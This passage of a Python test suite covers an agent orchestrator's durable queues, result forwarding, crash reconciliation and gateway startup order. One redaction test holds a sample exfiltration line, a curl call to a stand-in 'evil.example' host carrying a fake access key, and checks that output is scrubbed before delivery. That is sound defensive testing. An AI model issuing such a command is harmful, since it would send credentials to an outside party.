        # silently — the caller cleared the persisted forward anyway and the
        # completed result was gone for good.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=False):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()      # reads below are ON-DISK
        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"]

    @pytest.mark.asyncio
    async def test_a_successful_post_still_clears(self) -> None:
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=True):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()
        assert CrewStore("s1").forwards == []

    @pytest.mark.asyncio
    async def test_drain_keeps_what_it_could_not_deliver(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_forward("first")
        st.add_forward("second")
        # First delivers, second refuses: exactly one must remain. The drain now
        # clears only after the DURABLE transcript append lands, so stub that.
        with patch.object(orch, "_post_durable", new=AsyncMock(side_effect=[True, False])):
            await orch._drain_forwards(slot)
        assert [f["body"] for f in orch._store("s1").forwards] == ["second"]


class TestWriteBarrier:
    """`wait_writes` is the durability barrier — it must not miss a failure."""

    @pytest.mark.asyncio
    async def test_a_fast_write_failure_is_still_raised(self) -> None:
        # The barrier used to discard futures via a done-callback, so a write
        # that failed FAST vanished from the set before `wait_writes` snapshotted
        # it and the barrier reported success for a write that never landed.
        st = CrewStore("s1")
        st.add_msg("something to persist")
        with patch.object(Path, "write_text", side_effect=OSError("disk full")):
            st.save()
            # Let the executor finish BEFORE the barrier looks — this ordering is
            # the whole bug: a done-callback would already have dropped it.
            await asyncio.sleep(0.1)
            with pytest.raises(OSError):
                await st.wait_writes()

    @pytest.mark.asyncio
    async def test_a_successful_write_is_reaped(self) -> None:
        st = CrewStore("s1")
        st.save()
        await st.wait_writes()
        st.save()
        await st.wait_writes()            # must not re-raise or hang
        assert True


class TestGptRoundFive:
    """The five blocking findings from the review of 302cc7d91."""

    @pytest.mark.asyncio
    async def test_an_ask_entry_counts_as_live_work(self) -> None:
        # An entry waiting on the user's clarification is unfinished work. If the
        # mode can switch out from under it, the original request is abandoned
        # with no trace of why nothing ever happened.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("do the ambiguous thing")
        e["state"] = "ask"
        st.save()
        assert await orch.has_live_work("s1") is True

    @pytest.mark.asyncio
    async def test_a_continuation_records_its_topic(self) -> None:
        # A continuation runs under a NEW run id while staying on the EXISTING
        # topic. Without a persisted topic_id, reconciliation cannot tell the two
        # apart and invents a second topic keyed by the run id.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow up")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "idle"
        orch._subagents.continue_conversation = MagicMock(
            side_effect=lambda cid, task, **kw: _spawn_info(kw["_preassigned_id"]))
        await orch._dispatch_continue(slot, st, t, e)
        assert CrewStore("s1").entry(e["msg_id"])["topic_id"] == "t1"

    @pytest.mark.asyncio
    async def test_the_fallback_respawn_carries_a_durable_id(self) -> None:
        # conversation_gone respawns via `spawn`, which is a dispatch like any
        # other: without a persisted identity, a crash between the spawn and the
        # acceptance write leaves an id nothing can match, and reconciliation
        # re-executes the task.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("do it")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "idle"
        orch._subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone"))
        on_disk: list[str | None] = []

        def _spawn(task, **kw):
            # The identity must be readable from a FRESH store at spawn time.
            on_disk.append((CrewStore("s1").entry(e["msg_id"]) or {}).get("dispatch_id"))
            assert kw.get("_preassigned_id"), "respawn must carry the id it persisted"
            return _spawn_info(kw["_preassigned_id"])

        orch._subagents.spawn = _spawn
        await orch._dispatch_continue(slot, st, t, e)
        assert on_disk and on_disk[0], "respawn identity was not durable before the spawn"
        assert st.entry(e["msg_id"])["run_id"] == on_disk[0]

    @pytest.mark.asyncio
    async def test_closed_slot_completion_awaits_its_write(self) -> None:
        # The callback's return is what tells the subagent layer the result was
        # handled, so returning before the executor write lands turns a crash
        # into a lost result.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        e["state"] = "accepted"
        e["run_id"] = "r1"
        st.save()
        orch._owned["r1"] = "s1"
        orch._state.get_slot = MagicMock(return_value=None)      # tab closed
        await orch.on_subagent_done(_spawn_info("r1", done=True, result="the result body"))
        # Read from a FRESH store: the forward must already be on disk.
        assert any("the result body" in f["body"] for f in CrewStore("s1").forwards)


class TestLiveRunIsReOwned:
    """The one case where re-owning is right: the run really is still executing."""

    def test_a_live_run_is_adopted_and_not_settled(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("still going")
        e["state"] = "accepted"
        e["dispatch_id"] = "alive001"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=_spawn_info("alive001"))
        orch._state.get_slot = MagicMock(return_value=None)
        orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] == "accepted"
        assert orch._owned.get("alive001") == "s1"
        assert not CrewStore("s1").forwards, "a live run must not be reported interrupted"


class TestTopicCap:
    """topics.json is read INLINE when a slot's store is first touched, so it must
    stay bounded — an unbounded file puts a growing parse on the event loop."""

    def test_idle_topics_are_pruned_oldest_first(self) -> None:
        st = CrewStore("s1")
        for i in range(crew_mod._TOPIC_IDLE_CAP + 25):
            t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
            t["status"] = "idle"
            t["last_activity"] = float(i)          # ascending: t0 is the oldest
        st.save()
        kept = {t["topic_id"] for t in CrewStore("s1").topics}
        assert len(kept) == crew_mod._TOPIC_IDLE_CAP
        assert "t0" not in kept and "t24" not in kept          # oldest dropped
        assert f"t{crew_mod._TOPIC_IDLE_CAP + 24}" in kept     # newest kept

    def test_running_and_held_topics_are_never_pruned(self) -> None:
        st = CrewStore("s1")
        old_running = st.add_topic("keep-running", "r1", "still working", "m1")
        old_running["status"] = "running"
        old_running["last_activity"] = 0.0                     # the oldest of all
        old_held = st.add_topic("keep-held", "r2", "has queued msgs", "m2")
        old_held["status"] = "idle"
        old_held["held"] = ["m9"]
        old_held["last_activity"] = 0.0
        for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
            t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
            t["status"] = "idle"
            t["last_activity"] = float(i + 1)
        st.save()
        kept = {t["topic_id"] for t in CrewStore("s1").topics}
        assert "keep-running" in kept, "a running topic was pruned"
        assert "keep-held" in kept, "a topic still holding queued messages was pruned"


class TestContinuationIdentity:
    """A continuation must be recoverable by id after a crash mid-dispatch."""

    @pytest.mark.asyncio
    async def test_dispatch_id_is_durable_before_the_continue(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow up on that")
        t = st.add_topic("t1", "r1", "topic", e["msg_id"])
        t["status"] = "idle"
        on_disk: list[str | None] = []

        def _continue(conv_id, task, **kw):
            # At the moment of the side effect, the id must already be readable
            # from a FRESH store — i.e. it reached the file, not just the object.
            fresh = CrewStore("s1")
            on_disk.append((fresh.entry(e["msg_id"]) or {}).get("dispatch_id"))
            assert kw.get("_preassigned_id"), "the caller must supply the id it persisted"
            return _spawn_info(kw["_preassigned_id"])

        orch._subagents.continue_conversation = _continue
        await orch._dispatch_continue(slot, st, t, e)
        assert on_disk and on_disk[0], "dispatch_id was not durable before the continue"
        assert e["run_id"] == on_disk[0], "the run adopted an id other than the persisted one"


class TestDurableRunEvidence:
    """Reconciliation must not treat a volatile registry's silence as proof."""

    def test_unknown_run_is_reopened_not_stranded(self) -> None:
        # An `accepted` entry whose run has no durable record never actually
        # started (the process died with the capacity queue), so it must be
        # reopened rather than left accepted forever.
        st = CrewStore("s1")
        e = st.add_msg("do the thing")
        e["state"] = "accepted"
        e["dispatch_id"] = "gone1234"
        st.save()
        orch = _orch()
        # A restart leaves the in-process registry empty — that emptiness is
        # exactly what must NOT be read as evidence either way.
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None):
            orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] == "pending"

    def test_durable_state_outvotes_an_empty_registry(self) -> None:
        # THE discriminating case. After a restart the registry is empty, so the
        # old volatile check concluded "never ran" and reopened the entry —
        # re-executing a task that had in fact started. Durable state knows
        # better, and is the only thing that can distinguish the two.
        st = CrewStore("s1")
        e = st.add_msg("mutating task")
        e["state"] = "claimed"
        e["dispatch_id"] = "started1"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)      # restart: empty
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value={"id": "started1"}):
            orch._reconcile("s1", st)
        # NOT reopened: reopening would run the mutating task a second time.
        assert st.entry(e["msg_id"])["state"] != "pending"
        # And the user is told, rather than the task vanishing silently.
        assert any("interrupted" in f["body"] for f in CrewStore("s1").forwards)

    def test_a_failed_durable_lookup_fails_closed(self) -> None:
        # If the durable lookup itself errors we cannot prove the run never
        # started, so the safe answer is "assume it did" — never re-execute on an
        # unknown answer.
        st = CrewStore("s1")
        e = st.add_msg("mutating task")
        e["state"] = "claimed"
        e["dispatch_id"] = "unknown1"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", side_effect=OSError("disk gone")):
            orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] != "pending"

    def test_durably_recorded_run_is_not_re_dispatched(self) -> None:
        # Same shape, but state.json exists: the run DID start, so re-opening it
        # would re-execute a possibly-mutating task.
        st = CrewStore("s1")
        e = st.add_msg("do the thing")
        e["state"] = "claimed"
        e["dispatch_id"] = "live1234"
        st.save()
        orch = _orch()
        # A restart leaves the in-process registry empty — that emptiness is
        # exactly what must NOT be read as evidence either way.
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)   # tab not reopened yet
        with patch.object(crew_mod, "read_state", return_value={"id": "live1234"}):
            orch._reconcile("s1", st)
        # Started but no longer running: settled, NOT reopened (never re-execute)
        # and NOT left accepted forever (no completion is coming).
        assert st.entry(e["msg_id"])["state"] == "stopped"


# ── restart reconciliation ──


class TestReconcile:
    def test_interrupted_dispatch_reopens(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("m")
        e["state"] = "claimed"
        t = st.add_topic("t1", "r_dead", "topic", e["msg_id"])
        t["status"] = "running"
        st.save()
        subagents = MagicMock()
        subagents._agents = {}  # run not alive
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")
        assert st2.entry(e["msg_id"])["state"] == "pending"
        assert st2.topic("t1")["status"] == "idle"

    def test_live_run_reowned(self) -> None:
        st = CrewStore("s1")
        t = st.add_topic("t1", "r_live", "topic", "m0")
        t["status"] = "running"
        st.save()
        live = _spawn_info("r_live", done=False)
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=live)
        orch = _orch(subagents=subagents)
        orch._store("s1")
        assert orch.owns("r_live")


# ── mode plumbing ──


class TestModePlumbing:
    def test_valid_modes_include_crew(self) -> None:
        from kiro_crew.dashboard.chat_folders import _VALID_MODES

        assert "crew" in _VALID_MODES


# ── adversarial-review regression fixes ──


class TestReviewFixes:
    """Regressions pinned from the adversarial review of 9b13c971."""

    def test_post_redacts_llm_output(self) -> None:
        # B1: _post is the sole delivery chokepoint and must redact.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          return_value=("[URL-REDACTED]", ["w"])) as r_url, \
             patch.object(crew_mod, "redact_credentials",
                          return_value=("[CRED-REDACTED]", ["w"])) as r_cred:
            orch._post(slot, "curl https://evil.example/?d=AKIA123")
        r_url.assert_called_once()
        r_cred.assert_called_once()
        assert slot.append.call_args.args[1] == "[CRED-REDACTED]"

    def test_post_fails_closed_when_redaction_raises(self) -> None:
        # B1 companion: never post raw content if redaction itself breaks.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          side_effect=RuntimeError("boom")):
            orch._post(slot, "secret")
        slot.append.assert_not_called()

    @pytest.mark.asyncio
    async def test_refused_respawn_does_not_wedge_topic(self) -> None:
        # B2 (Opus): conversation_gone → respawn refused must NOT be
        # recorded as a live topic (no completion will ever arrive).
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: files expired"))
        subagents.spawn = MagicMock(
            return_value=_spawn_info("y", done=True, error="spawn refused: low memory"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        with patch.object(orch, "_post") as post:
            await orch._dispatch_continue(slot, st, t, e)
        assert e["state"] == "pending"          # re-examinable, not accepted
        assert t["status"] != "running"         # not wedged
        assert not orch.owns("y")
        post.assert_called_once()               # R1: user-visible signal

    @pytest.mark.asyncio
    async def test_successful_respawn_records_run_id(self) -> None:
        # R3: the respawn path must set e["run_id"] so completion settles it.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="resume_failed: no context"))
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._dispatch_continue(_slot(), st, t, e)
        assert e["state"] == "accepted"
        assert e["run_id"] == "r9"
        assert t["active_run_id"] == "r9"

    @pytest.mark.asyncio
    async def test_stale_hold_on_idle_topic_dispatches(self) -> None:
        # B2 (GPT): a hold decided while running but applied after the topic
        # went idle must dispatch, not strand the message in held forever.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r5"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("late follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # completed while the decision LLM was thinking
        await orch._apply(_slot(), st, {"do": "hold", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"
        assert t["status"] == "running"
        assert e["msg_id"] not in t.get("held", [])

    def test_reconcile_reopens_held_entries(self) -> None:
        # B2 (Opus) companion: restart must reopen held entries (their
        # dispatching completion may never arrive) and clear topic held
        # lists so nothing double-dispatches later.
        st = CrewStore("s1")
        e = st.add_msg("stuck")
        t = st.add_topic("t1", "r-dead", "topic", "m0")
        e["state"] = "held"
        t["held"] = [e["msg_id"]]
        st.save()
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=None)  # run unknown after restart
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")  # triggers _reconcile
        e2 = st2.entry(e["msg_id"])
        assert e2["state"] == "pending"
        assert st2.topic("t1")["held"] == []
        assert st2.topic("t1")["status"] == "idle"

    def test_save_prunes_old_terminal_entries(self) -> None:
        # R2: queue.json must stay bounded — terminal entries beyond the cap
        # are pruned oldest-first; live entries are never pruned.
        st = CrewStore("s1")
        live = st.add_msg("still pending")
        for i in range(crew_mod._QUEUE_TERMINAL_CAP + 50):
            e = st.add_msg(f"old {i}")
            e["state"] = "done"
        st.save()
        terminal = [e for e in st.queue if e["state"] == "done"]
        assert len(terminal) == crew_mod._QUEUE_TERMINAL_CAP
        assert terminal[0]["text"] == "old 50"  # oldest 50 dropped
        assert st.entry(live["msg_id"]) is not None

    @pytest.mark.asyncio
    async def test_forward_persisted_before_post_and_cleared_after(self) -> None:
        # Server GPT finding: a crash between persist and post must not lose the
        # result. Still true with immediate delivery — the durable copy exists
        # while _post runs, and is cleared only once it returns.
        orch = _orch()
        slot = _slot()
        seen: list[list[str]] = []
        on_disk: list[list[str]] = []

        def _spy(_slot, _content, kind="crew"):
            seen.append([f["body"] for f in orch._store("s1").forwards])
            # Read the persisted copy straight off disk: this is what survives a
            # crash, and the whole point of awaiting the write before posting.
            fresh = CrewStore("s1")
            on_disk.append([f["body"] for f in fresh.forwards])
            return True          # `_post` reports delivery; this one succeeded

        with patch.object(orch, "_post", side_effect=_spy) as post:
            await orch._queue_forward(slot, "result body")
        post.assert_called_once()
        assert seen == [["result body"]]                  # in the store DURING the post
        assert orch._store("s1").forwards == []           # cleared after it
        # And the write was AWAITED, not merely queued: _save offloads to the
        # executor, so without the await a completion followed by process exit
        # would lose the result. Nothing may still be in flight by post time.
        assert on_disk == [["result body"]]                # it reached the file

    @pytest.mark.asyncio
    async def test_reconcile_redelivers_orphaned_forwards(self) -> None:
        # Crash between persist and post: reconcile re-delivers on restart.
        st = CrewStore("s1")
        st.add_forward("orphaned result")
        await st.wait_writes()  # durable before the "restarted" store reads disk
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(orch, "_post", return_value=True) as post:
            orch._store("s1")     # _reconcile SCHEDULES the replay (it is sync)
            await asyncio.sleep(0.05)          # let that task run
        post.assert_called_once()
        assert "orphaned result" in post.call_args.args[1]
        await orch._store("s1").wait_writes()
        assert CrewStore("s1").forwards == []


# ── gateway wiring (GPT review finding on faf5a127) ──


class TestGatewayCrewInit:
    """_init_crew must attach AFTER dashboard init — calling it while
    dashboard_state is None silently disabled crew mode on every real boot."""

    def test_init_crew_attaches_when_dashboard_ready(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = MagicMock()
        g.dashboard_state.crew = None
        GatewayOrchestrator._init_crew(g)
        assert g.dashboard_state.crew is not None
        assert isinstance(g.dashboard_state.crew, CrewOrchestrator)

    def test_init_crew_noop_without_dashboard(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = None
        GatewayOrchestrator._init_crew(g)  # must not raise

    def test_startup_sequence_orders_crew_after_dashboard(self) -> None:
        # Static guard: in the gateway start sequence, _init_crew() must be
        # invoked after _init_dashboard() (the original defect called the
        # attach logic from _init_subagents, which runs earlier).
        import inspect

        import kiro_crew.slack.gateway as gw

        src = inspect.getsource(gw)
        dash = src.index("await self._init_dashboard()")
        crew = src.index("self._init_crew()")
        assert crew > dash

    @pytest.mark.asyncio
    async def test_completion_settles_store_when_slot_closed(self) -> None:
        # GPT finding on 7d6f4d7a: closing a crew slot mid-run must not leave
        # the topic wedged in "running" — settle + persist before slot check.
        state = MagicMock()
        state.get_slot = MagicMock(return_value=None)  # slot closed
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t1", "r7", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r7"
        orch._owned["r7"] = "s1"
        info = _spawn_info("r7", done=True, result="<<<SUMMARY all done >>>")
        await orch.on_subagent_done(info)
        assert t["status"] == "idle"          # settled, not wedged
        assert e["state"] == "done"
        await st.wait_writes()
        assert CrewStore("s1").topic("t1")["digest"] == "all done"  # persisted

    @pytest.mark.asyncio
    async def test_stopped_run_not_recorded_as_done(self) -> None:
        # GPT finding on a5bf0464: user-stopped runs have empty error but
        # outcome="stopped" — must not be persisted as success.
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t9", "r9", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r9"
        orch._owned["r9"] = "s1"
        info = _spawn_info("r9", done=True, result="partial", outcome="stopped")
        with patch.object(orch, "_queue_forward") as qf:
            await orch.on_subagent_done(info)
        assert e["state"] == "stopped"
        assert t["digest"] == "Stopped at your request."
        assert "Stopped at your request." in qf.call_args.args[1]

    @pytest.mark.asyncio
    async def test_save_offloads_write_and_newest_wins(self) -> None:
        # GPT finding on 76d35e37: store writes must not block the event loop.
        # Inside a running loop, _save schedules the disk write to the
        # executor; wait_writes() is the barrier. Newest snapshot wins.
        st = CrewStore("s1")
        st.add_msg("m1")  # sync path in fixture? — no: we're in a loop here
        st.queue[0]["text"] = "final"
        st.save()
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "final"

    def test_save_writes_inline_without_loop(self) -> None:
        # Sync callers (boot reconcile, tests) still get immediate durability.
        st = CrewStore("s1")
        st.add_msg("hello")
        assert CrewStore("s1").entry(st.queue[0]["msg_id"]) is not None

    def test_post_appends_without_implicit_broadcast(self) -> None:
        # GPT finding on 120fd95e: the explicit chat_message frame is the
        # single broadcast — append must be called with broadcast=False.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "hello")
        assert slot.append.call_args.kwargs.get("broadcast") is False
        orch._state.broadcast_ws.assert_called_once()

    @pytest.mark.asyncio
    async def test_ingest_persists_before_ack(self) -> None:
        # GPT finding on 120fd95e: the ack promises durability — the queue
        # entry must be on disk before the ack posts.
        orch = _orch()
        slot = _slot()
        order: list[str] = []
        st = orch._store("s1")
        real_wait = st.wait_writes

        async def traced_wait() -> None:
            await real_wait()
            order.append("durable")

        with patch.object(st, "wait_writes", side_effect=traced_wait), \
             patch.object(orch, "_post", side_effect=lambda *a, **k: order.append("ack")), \
             patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "important request")
            await asyncio.sleep(0)
        assert order == ["durable", "ack"]
        assert CrewStore("s1").queue[0]["text"] == "important request"

    @pytest.mark.asyncio
    async def test_failed_steer_on_idle_topic_dispatches(self) -> None:
        # GPT finding on 85f8fbe2: run completes during the steer await —
        # a failed steer must recheck status and continue, not hold forever.
        subagents = MagicMock()

        async def steer_and_complete(run_id: str, text: str):
            st.topic("t1")["status"] = "idle"  # completion raced the steer
            return False, "not_running"

        subagents.steer_run = steer_and_complete
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r8"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("correction")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"          # dispatched, not stranded
        assert e["msg_id"] not in t.get("held", [])

    @pytest.mark.asyncio
    async def test_wait_writes_propagates_failure(self) -> None:
        # GPT finding on 85f8fbe2: a failed durable write must surface, and
        # the generation must stay retryable (not recorded as landed).
        st = CrewStore("s1")
        with patch("pathlib.Path.replace", side_effect=OSError("disk full")):
            st.add_msg("doomed")
            with pytest.raises(OSError):
                await st.wait_writes()
        assert st._written_seq.get("queue.json", 0) == 0  # still retryable
        st.save()  # retry with healthy disk
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "doomed"


class TestGptRoundSixteen:
    """Restart replay must not duplicate, and an acknowledged row must be on disk."""

    @pytest.mark.asyncio
    async def test_two_concurrent_drains_post_each_forward_once(self) -> None:
        # `resume_persisted_slots` touches the store — which reconciles and
        # SCHEDULES a drain — and then calls `_resume_slot`, which drains again.
        # Both snapshot the pending list before either removal lands, so every
        # persisted forward was delivered twice on every restart. At-least-once
        # tolerates a duplicate after a crash; it does not excuse one by
        # construction.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_forward("the only copy")
        st.save()
        await st.wait_writes()

        posted: list[str] = []

        async def _record(_slot, body, kind="crew"):
            posted.append(body)
            await asyncio.sleep(0)      # a real await point between the drains
            return True

        with patch.object(orch, "_post_durable", side_effect=_record):
            await asyncio.gather(
                orch._drain_forwards(slot),
                orch._drain_forwards(slot),
            )
        assert posted == ["the only copy"], (
            f"the forward was delivered {len(posted)} times — concurrent drains "
            "are not serialized"
        )

    @pytest.mark.asyncio
    async def test_ingest_persists_the_user_row_before_returning(self) -> None:
        # The queue entry is durable, but `slot.append` only mutates memory. With
        # a plain `_post` for the ack, a crash before the periodic flush left the
        # queue holding work whose QUESTION was gone from the transcript.
        orch = _orch()
        slot = _slot()
        with _slot_save() as save, patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "check the feed")
        assert save.await_count == 1, (
            "ingest returned without forcing the slot to disk — the echoed user "
            "message and the acknowledgement were memory-only"
        )
